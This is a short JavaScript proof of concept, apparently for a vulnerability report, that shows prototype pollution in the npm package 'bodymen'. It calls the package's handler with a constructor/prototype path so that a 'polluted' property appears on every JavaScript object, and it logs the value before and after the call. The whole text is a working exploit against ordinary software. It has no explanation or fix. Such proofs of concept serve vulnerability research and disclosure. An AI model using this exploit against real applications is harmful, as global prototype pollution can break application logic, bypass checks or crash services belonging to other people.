var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const x = require('bodymen');
console.log({}.polluted);
x.handler('constructor', 'prototype', 'polluted', 'yes');
console.log({}.polluted);